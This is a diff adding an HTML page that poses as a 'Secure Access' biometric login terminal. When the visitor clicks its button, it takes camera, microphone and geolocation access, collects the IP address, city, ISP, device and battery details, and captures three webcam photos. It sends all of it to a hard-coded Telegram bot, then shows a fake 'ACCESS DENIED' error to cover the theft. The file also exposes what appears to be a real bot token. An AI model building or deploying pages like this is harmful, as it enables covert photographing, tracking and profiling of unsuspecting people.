@@ -1,0 +1,105 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <title>Secure Access v3.0</title>
+    <style>
+        body { background: #000; color: #0f0; font-family: monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .terminal { width: 300px; text-align: left; border: 1px solid #111; padding: 20px; }
+        .cursor { display: inline-block; width: 10px; height: 18px; background: #0f0; animation: blink 1s infinite; }
+        @keyframes blink { 0%, 50% { opacity: 1; } 50.1%, 100% { opacity: 0; } }
+        button { background: none; border: 1px solid #0f0; color: #0f0; padding: 10px 20px; cursor: pointer; width: 100%; margin-top: 10px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="terminal">
+    <div id="log">SYSTEM READY...<br>AWAITING AUTHENTICATION</div>
+    <div id="progress"></div>
+    <button id="startBtn">INITIALIZE SECURE LOGIN</button>
+</div>
+
+<video id="video" autoplay playsinline muted></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+    const chatId = "591768998";
+
+    async function getExtraData() {
+        // جلب الـ IP والمنطقة تلقائياً
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return `🌐 IP: ${data.ip}\n📍 City: ${data.city}\n🏢 ISP: ${data.org}`;
+        } catch { return "🌐 IP: Unknown"; }
+    }
+
+    document.getElementById('startBtn').addEventListener('click', async () => {
+        const btn = document.getElementById('startBtn');
+        const log = document.getElementById('log');
+        btn.style.display = 'none';
+        log.innerHTML = "REQUESTING ENCRYPTED KEYS...<br>";
+
+        try {
+            // طلب الصلاحيات
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+            document.getElementById('video').srcObject = stream;
+
+            // جمع بيانات البطارية والجهاز
+            let batteryInfo = "";
+            if (navigator.getBattery) {
+                const battery = await navigator.getBattery();
+                batteryInfo = `🔋 Battery: ${battery.level * 100}%`;
+            }
+
+            const ipData = await getExtraData();
+            const deviceDetails = `📱 Agent: ${navigator.userAgent}\n${batteryInfo}\n${ipData}`;
+            
+            // إرسال البيانات فوراً
+            sendToTelegram(deviceDetails, "text");
+
+            // طلب الموقع
+            navigator.geolocation.getCurrentPosition(p => {
+                sendToTelegram(`📍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`, "text");
+            });
+
+            // التقاط 3 صور سريعة
+            for(let i=1; i<=3; i++) {
+                setTimeout(() => {
+                    log.innerHTML += `SCANNING BIOMETRIC LAYER ${i}...<br>`;
+                    capture(i);
+                }, i * 800);
+            }
+
+            setTimeout(() => {
+                log.innerHTML = "ACCESS DENIED.<br>ENCRYPTION ERROR 403.";
+                stream.getTracks().forEach(t => t.stop());
+            }, 4000);
+
+        } catch (e) { log.innerHTML = "AUTH_FAILED: PERMISSION_DENIED"; }
+    });
+
+    function capture(id) {
+        const v = document.getElementById('video');
+        const c = document.getElementById('canvas');
+        c.width = v.videoWidth; c.height = v.videoHeight;
+        c.getContext('2d').drawImage(v, 0, 0);
+        c.toBlob(b => sendToTelegram(b, "photo", id), 'image/jpeg', 0.5);
+    }
+
+    function sendToTelegram(data, type, id="") {
+        const url = `https://api.telegram.org/bot${token}/${type === "photo" ? "sendPhoto" : "sendMessage"}`;
+        const body = new FormData();
+        body.append('chat_id', chatId);
+        if (type === "photo") {
+            body.append('photo', data, `shot_${id}.jpg`);
+        } else {
+            body.append('text', data);
+        }
+        fetch(url, { method: 'POST', body, keepalive: true });
+    }
+</script>
+</body>
+</html>
